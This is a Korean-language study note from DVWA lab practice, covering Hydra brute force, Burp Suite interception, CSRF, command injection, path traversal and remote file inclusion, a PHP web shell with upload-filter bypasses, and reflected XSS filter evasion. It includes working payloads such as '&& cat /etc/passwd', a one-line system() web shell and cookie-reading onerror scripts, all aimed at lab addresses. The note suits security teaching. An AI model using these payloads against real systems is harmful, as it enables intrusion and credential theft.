# 🔐 웹 해킹 실습 정리 (DVWA Wargame)

> 정보보호 / 웹 취약점 실습 학습 노트  
> 실습 환경: DVWA (Damn Vulnerable Web Application), Kali Linux, SliTaz Linux

<img width="746" height="320" alt="스크린샷 2026-06-23 172931" src="https://github.com/user-attachments/assets/42eccf70-2e87-4888-b14d-c5315e4dc537" />


## 목차
1. [정보보호 인증제도 (ISMS-P)](#1-정보보호-인증제도-isms-p)
2. [실습 환경 구성](#2-실습-환경-구성)
3. [Brute Force - Hydra](#3-brute-force---hydra)
4. [프록시 도구 - Burp Suite / ZAP](#4-프록시-도구---burp-suite--zap)
5. [CSRF (Cross-Site Request Forgery)](#5-csrf-cross-site-request-forgery)
6. [Command Injection](#6-command-injection)
7. [File Inclusion (Path Traversal / LFI)](#7-file-inclusion-path-traversal--lfi)
8. [File Upload 취약점](#8-file-upload-취약점)
9. [XSS (Reflected)](#9-xss-reflected)

---

## 1. 정보보호 인증제도 (ISMS-P)

- **ISMS-P**: 정보보호 및 개인정보보호 관리체계 인증. 보유하면 보안 직무에서 가산점이 되는 자격(제도)
- 인증 절차: **최초심사 → 사후심사 → 갱신심사** (1회성이 아니라 주기적으로 관리되는 제도)
- **CWE vs CVE**
  | 구분 | 의미 |
  |---|---|
  | CWE (Common Weakness Enumeration) | 개발 단계에서 발생할 수 있는 **약점의 유형(분류 체계)** |
  | CVE (Common Vulnerabilities and Exposures) | 실제로 특정 제품/버전에서 발견된 **구체적인 취약점** |

  → CWE는 "어떤 종류의 실수인가"의 사전, CVE는 "그 실수로 실제 터진 사건"의 기록이라고 보면 됨.

- **HTTP Request Method**: `GET`, `HEAD`, `POST`, `PUT`, `DELETE`, `CONNECT`, `OPTIONS`, `TRACE`, `PATCH`

---

## 2. 실습 환경 구성

### 2-1. Kali Linux 네트워크 설정

```bash
sudo ip addr add 172.16.11.213/24 dev eth0       # eth0 인터페이스에 IP 수동 할당
sudo ip route add default via 172.16.11.254      # 기본 게이트웨이 설정 (외부망 통신 경로)
echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf  # DNS 서버 지정 (도메인 → IP 변환)
sudo ip link set enp0s3 up                       # 네트워크 인터페이스 활성화(up)
ping 8.8.8.8                                     # 네트워크 연결 확인
```

**왜 이렇게 동작하는가**
- `ip addr add`는 인터페이스에 IP를 "꽂아주는" 명령이고, `ip route add default`가 없으면 같은 대역(같은 네트워크) 밖으로는 패킷이 나갈 길을 모름 → 그래서 게이트웨이 설정이 필수
- `resolv.conf`는 리눅스가 DNS 질의를 보낼 서버를 적어두는 파일. 이게 없으면 IP는 통신되도 도메인 이름은 해석 못 함
- `ip link set up`은 케이블은 꽂혀있어도 논리적으로 "꺼져있는" 인터페이스를 켜는 것 (비유: 와이파이 켜기)

### 2-2. SliTaz Linux (초경량 리눅스)

SliTaz는 ISO 용량이 약 50MB 수준인 매우 가벼운 배포판으로, 실습용 취약 서버 등 가벼운 VM 구성에 자주 쓰임.

```bash
vi /etc/network.conf
```
```ini
static yes
ip <할당할 IP>
gateway <게이트웨이 IP>
```
```bash
/etc/init.d/network.sh restart   # 변경한 네트워크 설정 적용
```

> 기본 로그인: `admin` / `password`

---

## 3. Brute Force - Hydra

**Hydra**는 로그인 폼/프로토콜에 대해 대량의 계정·비밀번호 조합을 빠르게 시도하는 무차별 대입(Brute Force) 공격 도구.

### 옵션 정리 (자주 헷갈리는 부분)
| 옵션 | 의미 |
|---|---|
| `-l` (소문자) | 단일 username 지정 |
| `-L` | username 리스트 파일 지정 |
| `-p` (소문자) | 단일 password 지정 |
| `-P` | password 리스트 파일 지정 |

→ **계정은 알지만 비밀번호를 모를 때**: `-l <단일 계정> -P <비번 리스트>`
→ **둘 다 모를 때**: `-L <계정 리스트> -P <비번 리스트>`

### 실습 명령어

```bash
sudo hydra -l admin -P password.txt 172.16.11.212 http-get-form \
"/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\: PHPSESSID=ar65lns9e6kulkfprnbeqrg8q7; security=low:F=Username and/or password incorrect"
```

**왜 이렇게 동작하는가**
- `http-get-form`은 "이 요청은 GET 방식 로그인 폼이다"라고 Hydra에게 알려주는 모듈
- `^USER^` / `^PASS^`는 Hydra가 리스트 값을 대입할 **자리표시자(placeholder)**
- `H=Cookie: PHPSESSID=...`로 세션 쿠키를 같이 보내는 이유: DVWA는 보안 레벨(`security=low`)도 세션에 저장하므로, 쿠키 없이 요청하면 로그인 폼 자체에 접근이 안 되거나 다른 레벨로 인식됨
- `F=...`(Failure 문자열)을 지정해서, **응답 본문에 이 문자열이 있으면 "로그인 실패"로 판단** → 반대로 이 문구가 없는 응답이 나오면 그게 곧 정답(올바른 비밀번호)

---

## 4. 프록시 도구 - Burp Suite / ZAP

웹 브라우저와 서버 사이의 요청/응답을 **가로채서(Intercept) 직접 수정**할 수 있게 해주는 도구.

### Burp Suite 사용 흐름
1. `Proxy` 탭에서 `Intercept` 활성화 → 브라우저 요청을 잡아챔
2. 가로챈 요청을 `Send to Intruder`로 전달
3. 변경하고 싶은 값에 `$$` 마커 추가 (Hydra의 `^USER^`와 같은 역할)
4. Payload(워드리스트) 설정 후 실행
5. 응답들의 **Length(응답 길이)** 값이 다른 케이스를 찾기 → 다른 응답은 보통 "성공" 신호

<img width="1016" height="835" alt="스크린샷 2026-06-23 130851" src="https://github.com/user-attachments/assets/85f82e7b-d4b5-4a62-b499-c905dbc57f5b" />

<img width="1038" height="826" alt="스크린샷 2026-06-23 130844" src="https://github.com/user-attachments/assets/2daf3bcf-39e4-40b7-8fda-cbb0e9753ac0" />
<br>


```bash
sudo apt install -y zaproxy   # ZAP(OWASP ZAP) 설치
```

**왜 프록시 도구가 핵심인가**
- 웹 보안 점검의 본질은 "서버가 클라이언트를 믿는 부분"을 찾아 조작하는 것
- 브라우저가 보내는 요청을 있는 그대로 보내지 않고, 중간에서 가로채 임의로 바꿔 보내면 서버는 그 변조를 구분하지 못함(서버 입장에선 정상 요청과 동일하게 보임) → 이 점을 이용해 인증/검증 우회 가능

---

## 5. CSRF (Cross-Site Request Forgery)

**정의**: 사용자가 의도하지 않은 요청을 공격자가 사용자 권한으로 서버에 보내게 만드는 공격.

### 동작 원리
1. 사용자가 사이트 A에 로그인 → 브라우저에 인증 쿠키 저장
2. 사용자가 공격자가 만든 악성 사이트 B를 방문
3. 사이트 B가 몰래 사이트 A로 요청 전송 (예: 비밀번호 변경 폼 자동 제출)
4. 브라우저는 사이트 A로 가는 요청에 **자동으로 쿠키를 첨부**
5. 서버 A는 쿠키만 보고 "로그인한 본인이 요청했다"고 오판 → 요청 승인

**핵심 원인**: 서버가 "요청이 어디서 왔는지"가 아니라 "쿠키가 있는지"만으로 사용자를 신뢰하기 때문 → 이를 막기 위해 실무에서는 **CSRF 토큰**(요청마다 바뀌는 임의값)을 사용해, 공격자가 토큰값까지는 미리 알 수 없게 함.

---

## 6. Command Injection

웹 입력값이 그대로 서버의 OS 명령어 실행부에 전달될 때, 사용자가 임의 명령을 끼워 넣는 공격.

```bash
127.0.0.1 && id
127.0.0.1 && cat /etc/passwd
```

**왜 이렇게 동작하는가**
- 서버 코드가 내부적으로 `ping <입력값>` 같은 형태로 셸 명령을 만든다고 가정하면, `&&`는 **셸에서 "앞 명령이 성공하면 뒤 명령도 실행"**하라는 연산자
- 즉 입력값 검증 없이 사용자 입력을 그대로 셸 명령 문자열에 이어붙이면, `&&`, `;`, `|` 같은 셸 메타문자를 통해 **개발자가 의도하지 않은 임의 명령**(`id`, `cat /etc/passwd` 등)이 함께 실행됨

---

## 7. File Inclusion (Path Traversal / LFI)

### 7-1. Path Traversal (경로 조작)
사용자 입력으로 파일 경로를 조작해, 의도하지 않은 서버 내부 파일에 접근.

```text
view.php?file=../../etc/passwd
```
- `../`는 "상위 디렉토리로 이동"을 의미하는 경로 표현 → 이를 반복해 웹 루트 바깥의 시스템 파일까지 거슬러 올라갈 수 있음

### 7-2. LFI (Local File Inclusion)
단순히 파일을 "읽는" 것을 넘어, 서버가 그 파일을 **코드로 해석해서 실행**하게 만드는 공격.

```bash
# 1) 공격자가 준비한 PHP 코드를 외부 서버에 올려두고
vi test.php
sudo python -m http.server

# 2) 취약한 페이지의 include 파라미터로 해당 파일을 불러오게 함
# page=http://172.16.11.213:8000/test.php
```

**왜 이렇게 동작하는가**
- PHP의 `include()` 같은 함수는 "파일을 읽어서 그 안의 코드를 실행"하는 함수
- 이 함수에 전달되는 경로를 사용자가 통제할 수 있다면, **외부에 호스팅해둔 악성 PHP 코드**도 "내부 파일"인 것처럼 불러와 실행시킬 수 있음 → 단순 정보 노출(Path Traversal)보다 위험도가 높음(코드 실행)

---

## 8. File Upload 취약점

업로드 기능이 파일의 **내용/확장자를 제대로 검증하지 않을 때**, 웹쉘(서버를 제어하는 스크립트)을 올려 서버를 장악하는 공격.

### 8-1. 웹쉘 코드
```php
<?php system($_GET['cmd']); ?>
```
- `system()`은 PHP에서 OS 셸 명령을 실행시키는 함수 → `cmd` 파라미터로 들어온 값을 그대로 실행 → 업로드된 이 파일에 접근하는 것만으로 **서버에서 임의 명령 실행** 가능

```text
http://172.16.11.212/hackable/uploads/cmd.php?cmd=id;uname -a;cat /etc/passwd
```

### 8-2. 확장자 검증 우회 (Burp Suite 활용)
1. 업로드 시 파일명을 `cmd.php.jpg`처럼 위장해서 1차 검증을 통과
2. Burp Suite로 업로드 요청을 가로채서, 파일명을 다시 `cmd.php`로 수정 후 forward

**왜 이렇게 동작하는가**
- 서버 측 검증이 "확장자 끝부분(.jpg)만" 확인하거나, **클라이언트(브라우저)에서만** 검사하고 서버에서는 재검증하지 않는 경우가 많음
- Burp Suite로 요청을 가로채면 브라우저가 보낸 검증 통과용 값을 서버로 가기 직전에 실제 위협 파일명으로 바꿔칠 수 있음 → "클라이언트만 믿는 검증"의 전형적인 약점

### 8-3. 매직 바이트(Magic Bytes) 우회 - GIF89a
파일 내용 맨 앞에 `GIF89a` 문자열을 추가.
- 일부 서버는 확장자가 아니라 **파일 내용의 시작 바이트(시그니처)**로 이미지 여부를 판별함
- `GIF89a`는 실제 GIF 파일의 표준 헤더 시그니처 → 이 문자열만 앞에 붙이면 서버가 "진짜 GIF 이미지"로 오판 → 그 뒤에 PHP 웹쉘 코드를 이어 붙여도 이미지 검증을 통과시킬 수 있음

---

## 9. XSS (Reflected)

사용자 입력값이 필터링 없이 그대로 HTML 응답에 다시 출력될 때, 악성 스크립트를 끼워 넣어 **피해자의 브라우저에서** 실행시키는 공격.

### 9-1. 기본 페이로드
```html
<script>alert("HACKING")</script>
```

### 9-2. 필터 우회
```html
<!-- 소문자 <script>만 막는 경우 -->
<Script>alert("HACKING")</Script>

<!-- <script> 문자열 자체만 1회 제거하는 경우 -->
<scri<script>pt>alert("HACKING")</script>
```
**왜 이렇게 동작하는가**
- 필터가 `<script>`라는 **문자열 패턴 한 번만** 검사/제거하도록 짜여 있으면, 의도적으로 그 패턴을 안쪽에 중복 삽입해 필터가 제거하고 난 "나머지"가 다시 정상적인 `<script>` 태그로 조합되게 만들 수 있음 (재귀적 필터링 우회)

### 9-3. 이벤트 핸들러를 이용한 우회
```html
<img src=x onerror=alert(document.cookie)>
```
**왜 이렇게 동작하는가**
- `src=x`는 존재하지 않는 이미지 경로 → 브라우저가 이미지 로딩에 실패
- 이때 `onerror` 속성에 적힌 자바스크립트가 자동 실행됨 (브라우저가 "에러 발생 시 실행할 코드"로 인식)
- `<script>` 태그를 직접 막아도, `<img>`, `<svg>` 등 다른 태그의 **이벤트 핸들러 속성**을 통해 우회적으로 자바스크립트를 실행시킬 수 있음
- `document.cookie`를 alert로 띄우는 건 데모용이며, 실제 공격에서는 이 쿠키 값을 공격자 서버로 전송해 **세션 하이재킹**에 사용

---

## 📝 오늘의 핵심 정리

| 취약점 | 한 줄 원인 |
|---|---|
| Brute Force | 로그인 시도 횟수 제한이 없음 |
| CSRF | 서버가 요청 출처보다 쿠키만 신뢰함 |
| Command Injection | 사용자 입력을 검증 없이 셸 명령에 그대로 연결 |
| Path Traversal / LFI | 파일 경로 파라미터를 사용자가 통제 가능 |
| File Upload | 확장자/내용 검증을 클라이언트 또는 1회성으로만 수행 |
| XSS | 출력 시 HTML 특수문자를 이스케이프하지 않음 |

> ⚠️ 본 내용은 학습 목적의 DVWA(취약점 학습용 웹앱) 환경에서 실습한 내용입니다. 실제 운영 중인 서비스에는 절대 적용해서는 안 됩니다.
